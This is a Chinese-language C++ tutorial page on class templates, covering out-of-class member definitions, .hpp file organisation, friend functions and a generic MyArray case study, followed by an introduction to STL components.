<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//类模板中成员函数类外实现</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T1</span>, <span class="keyword">class</span> <span class="title class_">T2</span>&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="comment">//成员函数类内声明</span></span><br><span class="line">	<span class="built_in">Person</span>(T1 name, T2 age);</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">showPerson</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	T1 m_Name;</span><br><span class="line">	T2 m_Age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造函数 类外实现</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T1</span>, <span class="keyword">class</span> <span class="title class_">T2</span>&gt;</span><br><span class="line">Person&lt;T1, T2&gt;::<span class="built_in">Person</span>(T1 name, T2 age) &#123;</span><br><span class="line">	<span class="keyword">this</span>-&gt;m_Name = name;</span><br><span class="line">	<span class="keyword">this</span>-&gt;m_Age = age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//成员函数 类外实现</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T1</span>, <span class="keyword">class</span> <span class="title class_">T2</span>&gt;</span><br><span class="line"><span class="type">void</span> Person&lt;T1, T2&gt;::<span class="built_in">showPerson</span>() &#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;姓名: &quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;m_Name &lt;&lt; <span class="string">&quot; 年龄:&quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;m_Age &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">Person&lt;string, <span class="type">int</span>&gt; <span class="title">p</span><span class="params">(<span class="string">&quot;Tom&quot;</span>, <span class="number">20</span>)</span></span>;</span><br><span class="line">	p.<span class="built_in">showPerson</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：类模板中成员函数类外实现时，需要加上模板参数列表</p>
<h4 id="1-3-7-类模板分文件编写"><a href="#1-3-7-类模板分文件编写" class="headerlink" title="1.3.7 类模板分文件编写"></a>1.3.7 类模板分文件编写</h4><p>学习目标：</p>
<ul>
<li>掌握类模板成员函数分文件编写产生的问题以及解决方式</li>
</ul>
<p>问题：</p>
<ul>
<li>类模板中成员函数创建时机是在调用阶段，导致分文件编写时链接不到</li>
</ul>
<p>解决：</p>
<ul>
<li>解决方式1：直接包含.cpp源文件</li>
<li>解决方式2：将声明和实现写到同一个文件中，并更改后缀名为.hpp，hpp是约定的名称，并不是强制</li>
</ul>
<p><strong>示例：</strong></p>
<p>person.hpp中代码：</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T1</span>, <span class="keyword">class</span> <span class="title class_">T2</span>&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Person</span>(T1 name, T2 age);</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">showPerson</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	T1 m_Name;</span><br><span class="line">	T2 m_Age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造函数 类外实现</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T1</span>, <span class="keyword">class</span> <span class="title class_">T2</span>&gt;</span><br><span class="line">Person&lt;T1, T2&gt;::<span class="built_in">Person</span>(T1 name, T2 age) &#123;</span><br><span class="line">	<span class="keyword">this</span>-&gt;m_Name = name;</span><br><span class="line">	<span class="keyword">this</span>-&gt;m_Age = age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//成员函数 类外实现</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T1</span>, <span class="keyword">class</span> <span class="title class_">T2</span>&gt;</span><br><span class="line"><span class="type">void</span> Person&lt;T1, T2&gt;::<span class="built_in">showPerson</span>() &#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;姓名: &quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;m_Name &lt;&lt; <span class="string">&quot; 年龄:&quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;m_Age &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>类模板分文件编写.cpp中代码</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">//#include &quot;person.h&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;person.cpp&quot;</span> <span class="comment">//解决方式1，包含cpp源文件</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//解决方式2，将声明和实现写到一起，文件后缀名改为.hpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;person.hpp&quot;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">Person&lt;string, <span class="type">int</span>&gt; <span class="title">p</span><span class="params">(<span class="string">&quot;Tom&quot;</span>, <span class="number">10</span>)</span></span>;</span><br><span class="line">	p.<span class="built_in">showPerson</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：主流的解决方式是第二种，将类模板成员函数写到一起，并将后缀名改为.hpp</p>
<h4 id="1-3-8-类模板与友元"><a href="#1-3-8-类模板与友元" class="headerlink" title="1.3.8 类模板与友元"></a>1.3.8 类模板与友元</h4><p>学习目标：</p>
<ul>
<li>掌握类模板配合友元函数的类内和类外实现</li>
</ul>
<p>全局函数类内实现 - 直接在类内声明友元即可</p>
<p>全局函数类外实现 - 需要提前让编译器知道全局函数的存在</p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//2、全局函数配合友元  类外实现 - 先做函数模板声明，下方在做函数模板定义，在做友元</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T1</span>, <span class="keyword">class</span> <span class="title class_">T2</span>&gt; <span class="keyword">class</span> <span class="title class_">Person</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果声明了函数模板，可以将实现写到后面，否则需要将实现体写到类的前面让编译器提前看到</span></span><br><span class="line"><span class="comment">//template&lt;class T1, class T2&gt; void printPerson2(Person&lt;T1, T2&gt; &amp; p); </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">class</span> T1, <span class="keyword">class</span> T2&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printPerson2</span><span class="params">(Person&lt;T1, T2&gt; &amp; p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;类外实现 ---- 姓名： &quot;</span> &lt;&lt; p.m_Name &lt;&lt; <span class="string">&quot; 年龄：&quot;</span> &lt;&lt; p.m_Age &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T1</span>, <span class="keyword">class</span> <span class="title class_">T2</span>&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//1、全局函数配合友元   类内实现</span></span><br><span class="line">	<span class="function"><span class="keyword">friend</span> <span class="type">void</span> <span class="title">printPerson</span><span class="params">(Person&lt;T1, T2&gt; &amp; p)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;姓名： &quot;</span> &lt;&lt; p.m_Name &lt;&lt; <span class="string">&quot; 年龄：&quot;</span> &lt;&lt; p.m_Age &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//全局函数配合友元  类外实现</span></span><br><span class="line">	<span class="keyword">friend</span> <span class="type">void</span> printPerson2&lt;&gt;(Person&lt;T1, T2&gt; &amp; p);</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">	<span class="built_in">Person</span>(T1 name, T2 age)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_Name = name;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_Age = age;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	T1 m_Name;</span><br><span class="line">	T2 m_Age;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1、全局函数在类内实现</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Person &lt;string, <span class="type">int</span> &gt;<span class="built_in">p</span>(<span class="string">&quot;Tom&quot;</span>, <span class="number">20</span>);</span><br><span class="line">	<span class="built_in">printPerson</span>(p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//2、全局函数在类外实现</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test02</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Person &lt;string, <span class="type">int</span> &gt;<span class="built_in">p</span>(<span class="string">&quot;Jerry&quot;</span>, <span class="number">30</span>);</span><br><span class="line">	<span class="built_in">printPerson2</span>(p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//test01();</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">test02</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：建议全局函数做类内实现，用法简单，而且编译器可以直接识别</p>
<h4 id="1-3-9-类模板案例"><a href="#1-3-9-类模板案例" class="headerlink" title="1.3.9 类模板案例"></a>1.3.9 类模板案例</h4><p>案例描述:  实现一个通用的数组类，要求如下：</p>
<ul>
<li>可以对内置数据类型以及自定义数据类型的数据进行存储</li>
<li>将数组中的数据存储到堆区</li>
<li>构造函数中可以传入数组的容量</li>
<li>提供对应的拷贝构造函数以及operator&#x3D;防止浅拷贝问题</li>
<li>提供尾插法和尾删法对数组中的数据进行增加和删除</li>
<li>可以通过下标的方式访问数组中的元素</li>
<li>可以获取数组中当前元素个数和数组的容量</li>
</ul>
<p><strong>示例：</strong></p>
<p>myArray.hpp中代码</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyArray</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    </span><br><span class="line">	<span class="comment">//构造函数</span></span><br><span class="line">	<span class="built_in">MyArray</span>(<span class="type">int</span> capacity)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_Capacity = capacity;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_Size = <span class="number">0</span>;</span><br><span class="line">		pAddress = <span class="keyword">new</span> T[<span class="keyword">this</span>-&gt;m_Capacity];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//拷贝构造</span></span><br><span class="line">	<span class="built_in">MyArray</span>(<span class="type">const</span> MyArray &amp; arr)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_Capacity = arr.m_Capacity;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_Size = arr.m_Size;</span><br><span class="line">		<span class="keyword">this</span>-&gt;pAddress = <span class="keyword">new</span> T[<span class="keyword">this</span>-&gt;m_Capacity];</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>-&gt;m_Size; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//如果T为对象，而且还包含指针，必须需要重载 = 操作符，因为这个等号不是 构造 而是赋值，</span></span><br><span class="line">			<span class="comment">// 普通类型可以直接= 但是指针类型需要深拷贝</span></span><br><span class="line">			<span class="keyword">this</span>-&gt;pAddress[i] = arr.pAddress[i];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//重载= 操作符  防止浅拷贝问题</span></span><br><span class="line">	MyArray&amp; <span class="keyword">operator</span>=(<span class="type">const</span> MyArray&amp; myarray) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span>-&gt;pAddress != <span class="literal">NULL</span>) &#123;</span><br><span class="line">			<span class="keyword">delete</span>[] <span class="keyword">this</span>-&gt;pAddress;</span><br><span class="line">			<span class="keyword">this</span>-&gt;m_Capacity = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">this</span>-&gt;m_Size = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">this</span>-&gt;m_Capacity = myarray.m_Capacity;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_Size = myarray.m_Size;</span><br><span class="line">		<span class="keyword">this</span>-&gt;pAddress = <span class="keyword">new</span> T[<span class="keyword">this</span>-&gt;m_Capacity];</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>-&gt;m_Size; i++) &#123;</span><br><span class="line">			<span class="keyword">this</span>-&gt;pAddress[i] = myarray[i];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//重载[] 操作符  arr[0]</span></span><br><span class="line">	T&amp; <span class="keyword">operator</span> [](<span class="type">int</span> index)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">this</span>-&gt;pAddress[index]; <span class="comment">//不考虑越界，用户自己去处理</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//尾插法</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">Push_back</span><span class="params">(<span class="type">const</span> T &amp; val)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span>-&gt;m_Capacity == <span class="keyword">this</span>-&gt;m_Size)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">this</span>-&gt;pAddress[<span class="keyword">this</span>-&gt;m_Size] = val;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_Size++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//尾删法</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">Pop_back</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span>-&gt;m_Size == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_Size--;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取数组容量</span></span><br><span class="line">	<span class="function"><span class="type">int</span> <span class="title">getCapacity</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">this</span>-&gt;m_Capacity;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取数组大小</span></span><br><span class="line">	<span class="function"><span class="type">int</span>	<span class="title">getSize</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">this</span>-&gt;m_Size;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//析构</span></span><br><span class="line">	~<span class="built_in">MyArray</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span>-&gt;pAddress != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">delete</span>[] <span class="keyword">this</span>-&gt;pAddress;</span><br><span class="line">			<span class="keyword">this</span>-&gt;pAddress = <span class="literal">NULL</span>;</span><br><span class="line">			<span class="keyword">this</span>-&gt;m_Capacity = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">this</span>-&gt;m_Size = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	T * pAddress;  <span class="comment">//指向一个堆空间，这个空间存储真正的数据</span></span><br><span class="line">	<span class="type">int</span> m_Capacity; <span class="comment">//容量</span></span><br><span class="line">	<span class="type">int</span> m_Size;   <span class="comment">// 大小</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>



<p>类模板案例—数组类封装.cpp中</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;myArray.hpp&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printIntArray</span><span class="params">(MyArray&lt;<span class="type">int</span>&gt;&amp; arr)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; arr.<span class="built_in">getSize</span>(); i++) &#123;</span><br><span class="line">		cout &lt;&lt; arr[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试内置数据类型</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">MyArray&lt;<span class="type">int</span>&gt; <span class="title">array1</span><span class="params">(<span class="number">10</span>)</span></span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		array<span class="number">1.</span><span class="built_in">Push_back</span>(i);</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;array1打印输出：&quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="built_in">printIntArray</span>(array1);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;array1的大小：&quot;</span> &lt;&lt; array<span class="number">1.</span><span class="built_in">getSize</span>() &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;array1的容量：&quot;</span> &lt;&lt; array<span class="number">1.</span><span class="built_in">getCapacity</span>() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;--------------------------&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="function">MyArray&lt;<span class="type">int</span>&gt; <span class="title">array2</span><span class="params">(array1)</span></span>;</span><br><span class="line">	array<span class="number">2.</span><span class="built_in">Pop_back</span>();</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;array2打印输出：&quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="built_in">printIntArray</span>(array2);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;array2的大小：&quot;</span> &lt;&lt; array<span class="number">2.</span><span class="built_in">getSize</span>() &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;array2的容量：&quot;</span> &lt;&lt; array<span class="number">2.</span><span class="built_in">getCapacity</span>() &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试自定义数据类型</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Person</span>() &#123;&#125; </span><br><span class="line">		<span class="built_in">Person</span>(string name, <span class="type">int</span> age) &#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_Name = name;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_Age = age;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	string m_Name;</span><br><span class="line">	<span class="type">int</span> m_Age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printPersonArray</span><span class="params">(MyArray&lt;Person&gt;&amp; personArr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; personArr.<span class="built_in">getSize</span>(); i++) &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;姓名：&quot;</span> &lt;&lt; personArr[i].m_Name &lt;&lt; <span class="string">&quot; 年龄： &quot;</span> &lt;&lt; personArr[i].m_Age &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test02</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//创建数组</span></span><br><span class="line">	<span class="function">MyArray&lt;Person&gt; <span class="title">pArray</span><span class="params">(<span class="number">10</span>)</span></span>;</span><br><span class="line">	<span class="function">Person <span class="title">p1</span><span class="params">(<span class="string">&quot;孙悟空&quot;</span>, <span class="number">30</span>)</span></span>;</span><br><span class="line">	<span class="function">Person <span class="title">p2</span><span class="params">(<span class="string">&quot;韩信&quot;</span>, <span class="number">20</span>)</span></span>;</span><br><span class="line">	<span class="function">Person <span class="title">p3</span><span class="params">(<span class="string">&quot;妲己&quot;</span>, <span class="number">18</span>)</span></span>;</span><br><span class="line">	<span class="function">Person <span class="title">p4</span><span class="params">(<span class="string">&quot;王昭君&quot;</span>, <span class="number">15</span>)</span></span>;</span><br><span class="line">	<span class="function">Person <span class="title">p5</span><span class="params">(<span class="string">&quot;赵云&quot;</span>, <span class="number">24</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//插入数据</span></span><br><span class="line">	pArray.<span class="built_in">Push_back</span>(p1);</span><br><span class="line">	pArray.<span class="built_in">Push_back</span>(p2);</span><br><span class="line">	pArray.<span class="built_in">Push_back</span>(p3);</span><br><span class="line">	pArray.<span class="built_in">Push_back</span>(p4);</span><br><span class="line">	pArray.<span class="built_in">Push_back</span>(p5);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printPersonArray</span>(pArray);</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;pArray的大小：&quot;</span> &lt;&lt; pArray.<span class="built_in">getSize</span>() &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;pArray的容量：&quot;</span> &lt;&lt; pArray.<span class="built_in">getCapacity</span>() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//test01();</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">test02</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：</p>
<p>能够利用所学知识点实现通用的数组</p>
<h2 id="2-STL初识"><a href="#2-STL初识" class="headerlink" title="2 STL初识"></a>2 STL初识</h2><h3 id="2-1-STL的诞生"><a href="#2-1-STL的诞生" class="headerlink" title="2.1 STL的诞生"></a>2.1 STL的诞生</h3><ul>
<li><p>长久以来，软件界一直希望建立一种可重复利用的东西</p>
</li>
<li><p>C++的<strong>面向对象</strong>和<strong>泛型编程</strong>思想，目的就是<strong>复用性的提升</strong></p>
</li>
<li><p>大多情况下，数据结构和算法都未能有一套标准,导致被迫从事大量重复工作</p>
</li>
<li><p>为了建立数据结构和算法的一套标准,诞生了<strong>STL</strong></p>
</li>
</ul>
<h3 id="2-2-STL基本概念"><a href="#2-2-STL基本概念" class="headerlink" title="2.2 STL基本概念"></a>2.2 STL基本概念</h3><ul>
<li>STL(Standard Template Library,<strong>标准模板库</strong>)</li>
<li>STL 从广义上分为: <strong>容器(container) 算法(algorithm) 迭代器(iterator)</strong></li>
<li><strong>容器</strong>和<strong>算法</strong>之间通过<strong>迭代器</strong>进行无缝连接。</li>
<li>STL 几乎所有的代码都采用了模板类或者模板函数</li>
</ul>
<h3 id="2-3-STL六大组件"><a href="#2-3-STL六大组件" class="headerlink" title="2.3 STL六大组件"></a>2.3 STL六大组件</h3><p>STL大体分为六大组件，分别是:<strong>容器、算法、迭代器、仿函数、适配器（配接器）、空间配置器</strong></p>
<ol>
<li>容器：各种数据结构，如vector、list、deque、set、map等,用来存放数据。</li>
<li>算法：各种常用的算法，如sort、find、copy、for_each等</li>
<li>迭代器：扮演了容器与算法之间的胶合剂。</li>
<li>仿函数：行为类似函数，可作为算法的某种策略。</li>
<li>适配器：一种用来修饰容器或者仿函数或迭代器接口的东西。</li>
<li>空间配置器：负责空间的配置与管理。</li>
</ol>
<h3 id="2-4-STL中容器、算法、迭代器"><a href="#2-4-STL中容器、算法、迭代器" class="headerlink" title="2.4  STL中容器、算法、迭代器"></a>2.4  STL中容器、算法、迭代器</h3><p><strong>容器：</strong>置物之所也</p>
<p>STL<strong>容器</strong>就是将运用<strong>最广泛的一些数据结构</strong>实现出来</p>
<p>常用的数据结构：数组, 链表,树, 栈, 队列, 集合, 映射表 等</p>
<p>这些容器分为<strong>序列式容器</strong>和<strong>关联式容器</strong>两种:</p>
<p>​	<strong>序列式容器</strong>:强调值的排序，序列式容器中的每个元素均有固定的位置。<br>​	<strong>关联式容器</strong>:二叉树结构，各元素之间没有严格的物理上的顺序关系</p>
<p><strong>算法：</strong>问题之解法也</p>
